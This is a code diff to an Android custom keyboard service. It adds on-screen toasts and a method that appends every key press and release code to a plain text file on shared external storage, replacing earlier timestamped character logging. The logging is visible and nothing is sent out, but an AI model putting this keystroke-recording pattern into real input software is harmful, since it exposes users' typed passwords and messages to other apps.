@@ -12,6 +12,7 @@ import android.text.TextUtils;
 import android.view.KeyEvent;
 import android.view.View;
 import android.view.inputmethod.InputConnection;
+import android.widget.Toast;
 
 import java.io.BufferedWriter;
 import java.io.File;
@@ -19,6 +20,7 @@ import java.io.FileNotFoundException;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.io.PrintWriter;
+import java.nio.Buffer;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 
@@ -27,6 +29,33 @@ public class MyInputMethodService extends InputMethodService implements Keyboard
     private Keyboard keyboard;
 
     private boolean isCaps = false;   // Caps Lock
+
+    private void showMsg(String msg)
+    {
+        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
+    }
+
+    private void saveKeyLog(int primaryCode, int type) {
+        String dirPath = Environment.getExternalStorageDirectory().getAbsolutePath() + "/LOG/";
+        File file = new File(dirPath, "LOG.TXT");
+        try {
+            if(!file.exists())
+                file.mkdirs();
+            BufferedWriter bfw = new BufferedWriter((new FileWriter(dirPath+"LOG.txt",true)));
+            bfw.write(Integer.toString(primaryCode));
+            if(type == 0) {
+                bfw.write(" P\n");
+            } else {
+                bfw.write(" R\n");
+            }
+            bfw.flush();
+            bfw.close();
+        } catch(IOException e) {
+            e.printStackTrace();
+        } catch(Exception e) {
+            e.printStackTrace();
+        }
+    }
 
     @Override
     public View onCreateInputView() {
@@ -39,45 +68,27 @@ public class MyInputMethodService extends InputMethodService implements Keyboard
 
     @Override
     public void onPress(int primaryCode) {
-        /////////////////////// 파일 쓰기 ///////////////////////
-        // 파일 생성
-        File saveFile = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/camdata"); // 저장 경로
-        // 폴더 생성
-        if(!saveFile.exists()){ // 폴더 없을 경우
-            saveFile.mkdir(); // 폴더 생성
-        }
-        try {
-            long now = System.currentTimeMillis(); // 현재시간 받아오기
-            Date date = new Date(now); // Date 객체 생성
-            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-            String nowTime = sdf.format(date);
+        // Shows message when Certain Key is Pressed
+        showMsg("Press - " + Integer.toString(primaryCode));
 
-            BufferedWriter buf = new BufferedWriter(new FileWriter(saveFile+"/CarnumData.txt", true));
-            PrintWriter pw= new PrintWriter(buf,true);
-            pw.write(nowTime + " "); // 날짜 쓰기
-            pw.write((char) primaryCode); // 파일 쓰기
-            pw.write("\n"); // 개행
-            pw.flush();
-            pw.close();
-        } catch (FileNotFoundException e) {
-            e.printStackTrace();
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
+        saveKeyLog(primaryCode, 0);
     }
 
     @Override
     public void onRelease(int primaryCode) {
+        // Shows message when Certain Key is Released
+        showMsg("Release - "+Integer.toString(primaryCode));
 
+        saveKeyLog(primaryCode, 1);
     }
 
     @Override
-    public void onKey(int i, int[] ints) {
+    public void onKey(int primaryCode, int[] keyCodes) {
         InputConnection inputConnection = getCurrentInputConnection();
         if (inputConnection == null)
             return;
 
-        switch (i) {
+        switch (primaryCode) {
             case Keyboard.KEYCODE_DELETE :
                 CharSequence selectedText = inputConnection.getSelectedText(0);
                 if (TextUtils.isEmpty(selectedText)) {
@@ -95,7 +106,7 @@ public class MyInputMethodService extends InputMethodService implements Keyboard
                 inputConnection.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
                 break;
             default:
-                char code = (char) i;
+                char code = (char) primaryCode;
                 if (Character.isLetter(code) && isCaps) {
                     code = Character.toUpperCase(code);
                 }
